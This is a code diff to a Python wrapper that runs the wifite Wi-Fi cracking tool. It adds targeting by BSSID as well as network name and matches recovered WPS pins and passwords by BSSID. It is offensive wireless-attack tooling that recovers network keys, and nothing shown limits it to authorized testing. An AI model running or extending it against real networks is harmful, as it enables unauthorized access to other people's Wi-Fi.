@@ -74,14 +74,15 @@ def kill_proc_later(proc, timeout, cleanup):
     return timer
 
 
-def attack_target(interface, essid):
+def attack_target(interface, essid, bssid=None):
     logging.info(f"Starting attack on {essid}...")
 
     os.makedirs(BASE_DIR / "data", exist_ok=True)
     os.chdir(BASE_DIR / "data")
 
+    target_args = ["-b", bssid] if bssid else ["-e", essid]
     proc = subprocess.Popen(
-        WIFITE_ARGS + ["-i", interface, "-e", essid],
+        WIFITE_ARGS + ["-i", interface] + target_args,
         stdout=subprocess.PIPE,
         stderr=subprocess.STDOUT,
         text=True,
@@ -122,7 +123,12 @@ def attack_target(interface, essid):
             with open(CRACKED_FILE) as f:
                 cracked_data = json.load(f)
             for entry in cracked_data:
-                if entry.get("essid") == essid and entry.get("pin") == pin:
+                same_target = (
+                    entry.get("bssid", "").upper() == bssid.upper()
+                    if bssid
+                    else entry.get("essid") == essid
+                )
+                if same_target and entry.get("pin") == pin:
                     recovered_psk = entry.get("psk")
                     if recovered_psk:
                         psk = recovered_psk
